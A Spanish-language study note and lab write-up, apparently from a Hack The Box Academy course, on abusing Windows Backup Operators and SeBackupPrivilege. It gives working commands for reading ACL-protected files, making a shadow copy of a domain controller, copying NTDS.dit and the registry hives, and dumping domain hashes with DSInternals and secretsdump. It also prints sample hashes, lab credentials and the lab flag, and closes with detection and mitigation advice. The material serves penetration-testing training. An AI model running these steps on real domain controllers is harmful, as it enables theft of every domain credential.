# Privilegios de Grupos Windows



## Grupos incorporados en Windows

* Windows incluye varios **grupos incorporados** (built-in) que existen desde Server 2008 R2 en adelante (excepto *Hyper-V Administrators*, introducido en 2012).
* Al instalar Active Directory Domain Services en un servidor (promoverlo a Domain Controller) se agregan grupos adicionales con privilegios especiales.
* **Importante en una evaluación:** comprobar membresías innecesarias o excesivas en estos grupos y anexar la lista de miembros en el informe.

**Grupos a revisar:**

* [Backup Operators](https://learn.microsoft.com/es-es/windows-server/identity/ad-ds/manage/understand-security-groups#bkmk-backupoperators)
* [Event Log Readers](https://learn.microsoft.com/es-es/windows-server/identity/ad-ds/manage/understand-security-groups#bkmk-eventlogreaders)
* [DnsAdmins](https://learn.microsoft.com/es-es/windows-server/identity/ad-ds/manage/understand-security-groups#bkmk-dnsadmins)
* [Hyper-V Administrators](https://learn.microsoft.com/es-es/windows-server/identity/ad-ds/manage/understand-security-groups#bkmk-hypervadministrators)
* [Print Operators](https://learn.microsoft.com/es-es/windows-server/identity/ad-ds/manage/understand-security-groups#bkmk-printoperators)
* [Server Operators](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#bkmk-serveroperators)

> *Nota:* los administradores de backup u otras cuentas de servicio suelen añadirse para delegar tareas (backups, impresión, DNS). A veces quedan por error.
> Siempre debemos revisar estos grupos e incluir una lista de los miembros de cada uno como apéndice en nuestro informe para que el cliente la revise y determine si el acceso sigue siendo necesario.

[Grupos de Windows](https://ss64.com/nt/syntax-security_groups.html)

[Cuentas y grupos con privilegios en AD](https://learn.microsoft.com/es-es/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)


[Asignación de derechos de usuario](https://learn.microsoft.com/es-es/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/user-rights-assignment)

---

## Backup Operators

### Privilegios

* Miembros del grupo **Backup Operators** reciben los privilegios **SeBackupPrivilege** y **SeRestorePrivilege**.
* [**SeBackupPrivilege**](https://learn.microsoft.com/es-es/windows-hardware/drivers/ifs/privileges) permite *recorrer* cualquier carpeta y leer contenido para fines de backup, **ignorando** las ACE normales del ACL —pero no mediante comandos de copia estándar sin tratar la semántica de backup.

`Nota`: [SeBackupPrivilege doc](https://learn.microsoft.com/es-es/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/back-up-files-and-directories)

### Limitaciones y matices

* No siempre basta el `copy`/`type`/`cat`; es necesario usar APIs/flags que respeten *backup semantics*, por ejemplo [`FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/es-es/windows/win32/api/fileapi/nf-fileapi-createfilea).
* Si existe una entrada explícita *Deny* en la ACL para el usuario/grupo, esta prevalecerá y bloqueará el acceso aun con el privilegio de backup.
* En algunos servidores puede ser necesario un **símbolo del sistema elevado** (bypass UAC) para activar/usar el privilegio.

---

Tras acceder a una máquina, podemos mostrar nuestra pertenencia actual a los grupos usando el comando:
```powershell
whoami /groups
```

En el siguiente ejemplo examinaremos el caso que pertenecemos al grupo `Backup Operators`.

## Herramientas y PoC: activar y explotar SeBackupPrivilege

[PoC](https://github.com/giuliano108/SeBackupPrivilege)

### Importar módulos PowerShell

```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

### Verificar privilegios

```powershell
whoami /priv
# o usando el cmdlet
Get-SeBackupPrivilege
```

Salida:

```
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege           Restore files and directories  Disabled
SeChangeNotifyPrivilege      Bypass traverse checking       Enabled
```

### Habilitar SeBackupPrivilege

```powershell
Set-SeBackupPrivilege
Get-SeBackupPrivilege
SeBackupPrivilege is enabled
```

> **Nota:** Según la configuración del servidor, es posible que sea necesario generar un símbolo del sistema elevado para omitir el UAC y tener este privilegio.

---

## Copiar un archivo protegido usando el privilegio

### Escenario: no puedo hacer `cat` pero sí puedo copiar con el PoC

```powershell
dir C:\Confidential\

    Directory: C:\Confidential

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         5/6/2021   1:01 PM             88 2021 Contract.txt

cat 'C:\Confidential\2021 Contract.txt' 

cat : Access to the path 'C:\Confidential\2021 Contract.txt' is denied.
At line:1 char:1
+ cat 'C:\Confidential\2021 Contract.txt'
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Confidential\2021 Contract.txt:String) [Get-Content], Unauthor
   izedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand

Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
Copied 88 bytes
cat .\Contract.txt
Inlanefreight 2021 Contract

==============================

Board of Directors:

<...SNIP...>
```

**Explicación:** `Copy-FileSeBackupPrivilege` abre el archivo protegido usando la semántica de backup (ej.: `BackupRead` / `FILE_FLAG_BACKUP_SEMANTICS`), lo lee pese a la DACL original y escribe un nuevo archivo en la ruta destino. El nuevo fichero es creado por el proceso atacante y, por defecto, su propietario será el token que realizó la copia. El ownership y las ACL del archivo original no se modifican.

---

## Atacar un Domain Controller — objetivo: NTDS.dit

### NTDS.dit 

* Contiene la base de datos de Active Directory con hashes NTLM de cuentas de dominio (usuarios, equipos, krbtgt, etc.).
* Acceder a este archivo permite extraer credenciales y escalar completamente en el dominio.

### NTDS.dit está bloqueado en uso

* El archivo está bloqueado por el sistema mientras AD está funcionando. Solución: crear un **shadow copy** del volumen y exponerlo.
El sistema no utilizará el archivo NTDS.dit de esta instantánea.

### Usando DiskShadow para exponer la copia

Utilizamos [`diskshadow.exe`](https://learn.microsoft.com/es-es/windows-server/administration/windows-commands/diskshadow):

```
PS C:\htb> diskshadow.exe
DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit
```

Luego `dir E:\` mostrará la estructura de la copia y el archivo `E:\Windows\NTDS\ntds.dit` será legible:

```
    Directory: E:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         5/6/2021   1:00 PM                Confidential
d-----        9/15/2018  12:19 AM                PerfLogs
d-r---        3/24/2021   6:20 PM                Program Files
d-----        9/15/2018   2:06 AM                Program Files (x86)
d-----         5/6/2021   1:05 PM                Tools
d-r---         5/6/2021  12:51 PM                Users
d-----        3/24/2021   6:38 PM                Windows
```

---

## Copiar NTDS.dit desde la shadow copy

La shadow copy preserva la metadata del sistema de archivos del volumen original (ACLs, owners, timestamps).

Utilizamos el PoC para omitir la ACL y copiar NTDS.dit localmente:

```powershell
PS C:\htb> Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
Copied 16777216 bytes
```

### Alternativa: usar [`robocopy`](https://learn.microsoft.com/es-es/windows-server/administration/windows-commands/robocopy) en modo backup

```cmd
C:\htb> robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```

* La opción `/B` (backup mode) permite leer archivos con la semántica de backup.
* `robocopy` es conveniente porque ya viene en Windows y evita herramientas externas.

---

## Hacer backup de las colmenas del registro (SAM y SYSTEM)


- `HKLM\SAM` contiene las cuentas locales (SAM) y hashes locales (en equipos no-DC).


- `HKLM\SYSTEM` contiene la configuración del sistema, y contiene la boot key (información que permite derivar la bootkey necesaria para descifrar protección interna; en AD es necesaria para desmontar/descifrar ciertos secretos) que se usa para extraer hashes del `ntds.dit` o del `SAM`.

`Nota`: Como ya copiamos `ntds.dit` a un lugar seguro, necesitamos la información del SYSTEM (bootkey) para poder descifrar los secretos dentro del `ntds.dit`. Para cuentas locales (SAM) también necesitamoss la hive SYSTEM en ciertos procesos para obtener la clave de cifrado.

* Con privilegios de backup podemos guardar las colmenas y analizarlas offline.

`Active Directory` guarda secretos (hashes, credenciales) en `NTDS.dit`, pero algunos datos están protegidos con una clave maestra del dominio (`PEK` / `Password Encryption Key`), la cual a su vez está protegida por la `boot key` derivada de valores presentes en la hive `SYSTEM`.

Para desencriptar las credenciales en `ntds.dit` offline necesitamos:

- `ntds.dit` (la base de datos AD) — copiada desde la shadow.

- El hive `SYSTEM` (o su boot key) — para derivar la clave que descifra `PEK` y demás.

```cmd
C:\htb> reg save HKLM\SYSTEM SYSTEM.SAV
C:\htb> reg save HKLM\SAM SAM.SAV
```

* Esto permite, por ejemplo, usar `secretsdump.py` o módulos PowerShell para extraer hashes.

---

## Extraer credenciales desde NTDS.dit (offline)

### Usando DSInternals (PowerShell)

```powershell
Import-Module .\DSInternals.psd1
$key = Get-BootKey -SystemHivePath .\SYSTEM
Get-ADDBAccount -DistinguishedName 'CN=Administrator,CN=Users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
# Muestra NTHash, Kerberos keys, etc.

DistinguishedName: CN=Administrator,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
Sid: S-1-5-21-669053619-2741956077-1013132368-500
Guid: f28ab72b-9b16-4b52-9f63-ef4ea96de215
SamAccountName: Administrator
SamAccountType: User
UserPrincipalName:
PrimaryGroupId: 513
SidHistory:
Enabled: True
UserAccountControl: NormalAccount, PasswordNeverExpires
AdminCount: True
Deleted: False
LastLogonDate: 5/6/2021 5:40:30 PM
DisplayName:
GivenName:
Surname:
Description: Built-in account for administering the computer/domain
ServicePrincipalName:
SecurityDescriptor: DiscretionaryAclPresent, SystemAclPresent, DiscretionaryAclAutoInherited, SystemAclAutoInherited,
DiscretionaryAclProtected, SelfRelative
Owner: S-1-5-21-669053619-2741956077-1013132368-512
Secrets
  NTHash: cf3a5525ee9414229e66279623ed5c58
  LMHash:
  NTHashHistory:
  LMHashHistory:
  SupplementalCredentials:
    ClearText:
    NTLMStrongHash: 7790d8406b55c380f98b92bb2fdc63a7
    Kerberos:
      Credentials:
        DES_CBC_MD5
          Key: d60dfbbf20548938
      OldCredentials:
      Salt: WIN-NB4NGP3TKNKAdministrator
      Flags: 0
    KerberosNew:
      Credentials:
        AES256_CTS_HMAC_SHA1_96
          Key: 5db9c9ada113804443a8aeb64f500cd3e9670348719ce1436bcc95d1d93dad43
          Iterations: 4096
        AES128_CTS_HMAC_SHA1_96
          Key: 94c300d0e47775b407f2496a5cca1a0a
          Iterations: 4096
        DES_CBC_MD5
          Key: d60dfbbf20548938
          Iterations: 4096
      OldCredentials:
      OlderCredentials:
      ServiceCredentials:
      Salt: WIN-NB4NGP3TKNKAdministrator
      DefaultIterationCount: 4096
      Flags: 0
    WDigest:
Key Credentials:
Credential Roaming
  Created:
  Modified:
  Credentials:
```

- `Get-BootKey` obtiene la boot key desde el hive `SYSTEM`.
- `Get-ADDBAccount` abre la DB `ntds.dit` y desencripta secretos usando la boot key.****
- `DistinguishedName` es una cadena que identifica únicamente a un objeto dentro del árbol de Active Directory. Va desde el nombre del propio objeto hasta la raíz del dominio, indicando contenedores intermedios. La cadena se lee de izquierda a derecha representando desde lo más específico (el objeto) hacia lo más general (el dominio).

### Usando Impacket `secretsdump.py` (offline)

```bash
$ secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL


Impacket v0.9.23.dev1+20210504.123629.24a0ae6f - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0xc0a9116f907bd37afaaa845cb87d0550
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 85541c20c346e3198a3ae2c09df7f330
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WINLPE-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7abf052dcef31f6305f1d4c84dfa7484:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a05824b8c279f2eb31495a012473d129:::
htb-student:1103:aad3b435b51404eeaad3b435b51404ee:2487a01dd672b583415cb52217824bb5:::
svc_backup:1104:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
bob:1105:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
hyperv_adm:1106:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
printsvc:1107:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::

<SNIP>
```
- `-ntds ntds.dit` Indica la ruta del archivo NTDS.dit
- `-system SYSTEM` Es el archivo `SYSTEM hive` del registro de Windows.
- `-hashes lmhash:nthash` Permite especificar manualmente los hashes LM y NTLM si ya los tienes.

Si no existen LM hashes (lo común en sistemas modernos), se usa aad3b435b51404eeaad3b435b51404ee como valor vacío.

---


* Con los hashes se puede realizar **pass-the-hash** o cracking offline (Hashcat) para obtener contraseñas en texto.

---

## Recomendaciones para un informe de seguridad (post-explotación)

* **Documentar cada paso**: comandos ejecutados, módulos usados, timestamps, archivos leídos/copied.
* **Incluir apéndice** con la **lista de miembros de cada grupo sensible** (ej.: Backup Operators, Domain Admins, etc.).
* **Riesgos:** dejar shadow copies expuestos o backups locales puede causar fuga de datos; revertir/excluir snapshots si el cliente lo solicita.
* **Acciones destructivas:** ciertas operaciones (exposición de VSS, modificaciones en el service state) pueden dañinar o afectar disponibilidad; obtener consentimiento.
* **Reversión:** siempre intentar revertir permisos/propiedades/ownership si se modificaron; si no es posible, notificar y documentar en el informe.

---

## Buenas prácticas de detección y mitigación 

* Limitar miembros de grupos privilegiados: aplicar principio de *least privilege*.
* Monitorizar uso de privilegios sensibles y eventos relacionados (Event IDs: p. ej. 4672 para privilegios especiales, 1102 para event log cleared, etc.).
* Proteger y auditar cuentas de servicio: evitar añadir cuentas de alto privilegio innecesarias.
* Habilitar control de acceso y alertas cuando se crean/exponen shadow copies o cuando `vssadmin`, `diskshadow` o `robocopy /B` se usan en servidores críticos.
* Restringir acceso a la consola local de Domain Controllers (MFA, control físico y bastionado).



---

# Laboratorio

#### Aproveche los derechos de SeBackupPrivilege y obtenga la bandera ubicada en c:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt

- `Ip`: `10.129.43.42`

- `Credenciales`: `svc_backup`:`HTB_@cademy_stdnt!`


Nos conectamos al host mediante rdp:

```bash
xfreerdp /v:10.129.43.42 /u:svc_backup
```

<img width="1547" height="919" alt="image" src="https://github.com/user-attachments/assets/710d0726-36a0-455c-8366-82cbfc7f2f74" />


Abrimos una powershell como administrador y corroboramos nuestros grupos de pertenencia:
```powershell
whoami /groups
```

<img width="1031" height="769" alt="image" src="https://github.com/user-attachments/assets/64eb68d2-1e59-4260-b66d-39063c47e5d5" />


Confirmamos que pertenecemos al grupo `Backup Operators` por lo que deberíamos tener asignado el privilegio `SeBackupPrivilege`:

Utilizamos el comando `whoami /priv`:
<img width="981" height="597" alt="image" src="https://github.com/user-attachments/assets/88e81b5b-52f6-455a-b341-7a8c18d7e0c9" />


Vemos que tenemos deshabilitado el privilegio.



Utilizamos el PoC `SeBackupPrivilege`, buscamos los módulos a importar:

```powershell
Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue -Include SeBackupPrivilegeUtils.dll | Select-Object FullName
```
```powershell
Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue -Include SeBackupPrivilegeCmdLets.dll | Select-Object FullName
```

<img width="1125" height="408" alt="image" src="https://github.com/user-attachments/assets/9a433bcf-8ce9-4d15-bebf-343b68492818" />

Ambos archivos están en la ruta `C:\Tools\

Importamos los módulos:
```powershell
Import-Module C:\Tools\SeBackupPrivilegeUtils.dll
```
```powershell
Import-Module C:\Tools\SeBackupPrivilegeCmdLets.dll
```

Habilitamos `SeBackupPrivilege` y confirmamos:
```powershell
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```

<img width="685" height="235" alt="image" src="https://github.com/user-attachments/assets/814d2407-1b91-4611-a4dd-9452562f45b8" />



Intentamos leer el archivo del laboratorio con el somando:
```powershell
cat C:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt
```

<img width="982" height="239" alt="image" src="https://github.com/user-attachments/assets/93b36833-df46-49ab-b3c1-5ce8dfd4d698" />

Como era de esperar, tenemos acceso denegado.

Utilizamos la `PoC` para realizar una copia con sintaxis de backup:
```powershell
Copy-FileSeBackupPrivilege 'C:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt' .\flag.txt
```
Una vez copiado el fichero, obtenemos la flag leyendolo:
<img width="1099" height="383" alt="image" src="https://github.com/user-attachments/assets/e5ab6db4-45b7-47fb-935f-223ea9c36985" />


- `Flag`: `Car3ful_w1th_gr0up_m3mberSh1p!`
